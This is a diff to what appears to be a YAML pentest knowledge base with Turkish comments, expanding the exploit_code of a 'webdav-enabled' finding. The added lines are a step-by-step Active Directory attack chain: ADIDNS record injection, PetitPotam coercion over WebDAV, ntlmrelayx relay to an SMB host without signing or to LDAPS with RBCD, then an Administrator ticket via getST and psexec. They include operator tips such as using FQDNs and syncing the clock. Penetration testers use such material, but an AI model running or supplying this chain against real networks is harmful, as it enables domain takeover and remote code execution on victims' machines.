@@ -686,11 +686,29 @@ webdav-enabled:
     # poison modülü — nxc webdav (WebClient çalışıyor mu)
     nxc smb <hosts> -u user -p pass -M webdav
   exploit_code: |
-    # MANUEL — HTTP coercion (WebClient) + LDAP(S) relay zinciri
-    # T1: LDAPS'e relay, RBCD delege et
-    impacket-ntlmrelayx -t ldaps://<dc> --delegate-access
-    # T2: WebDAV auth'u tetikle (ör. PetitPotam -pipe, veya .searchConnector-ms)
-    python3 PetitPotam.py -u user -p pass <attacker>@80/x <victim>
+    # MANUEL — WebDAV (WebClient) HTTP coercion'u iki ayrı relay yoluyla sömürme.
+    # Ortak ön koşul: saldırgan adı intranet/kısa isimle çözülmeli (ADIDNS kaydı),
+    # '@80' eki kurbanı SMB yerine WebDAV/HTTP'ye zorlar.
+    python3 dnstool.py -u 'DOM\user' -p 'pass' -r attacksrv \
+      -d <attacker-ip> --action add <dc>
+
+    # ── Yol A: HTTP coercion → SMB relay (signing=false hedefe) ──
+    # Dinleyici: signing kapalı hedefe relay (admin ise SAM dump / -c ile exec).
+    impacket-ntlmrelayx -t smb://<signing-false-host> -smb2support -socks
+    # Tetikle (WebDAV/HTTP):
+    python3 PetitPotam.py -u user -p pass "attacksrv@80/x" <webdav-host>
+    # Not: coerce edilen genelde MAKİNE hesabıdır; SMB relay ancak o hesap
+    # hedefte local admin ise iş görür. Değilse Yol B'yi kullan.
+
+    # ── Yol B: HTTP coercion → LDAPS relay + RBCD (kurban makineyi ele geçir) ──
+    impacket-ntlmrelayx -t ldaps://<dc> --delegate-access -smb2support
+    python3 PetitPotam.py -u user -p pass "attacksrv@80/x" <webdav-host>
+    # ntlmrelayx yeni bir makine hesabı (RBCD) oluşturur; onunla S4U bileti al.
+    # Kerberos IP sevmez: -dc-ip ver, SPN'de ve psexec'te FQDN kullan, saati senkronla.
+    impacket-getST -spn cifs/<victim-fqdn> -impersonate Administrator \
+      'DOM/<yeni-makine$>:<parola>' -dc-ip <dc-ip>
+    export KRB5CCNAME=Administrator@cifs_<victim-fqdn>@<REALM>.ccache
+    impacket-psexec -k -no-pass <victim-fqdn>
   remediation: "Gereksizse WebClient servisini kapatın; EPA + signing."
   references:
     - "https://book.hacktricks.xyz/windows-hardening/ntlm/httprelay"
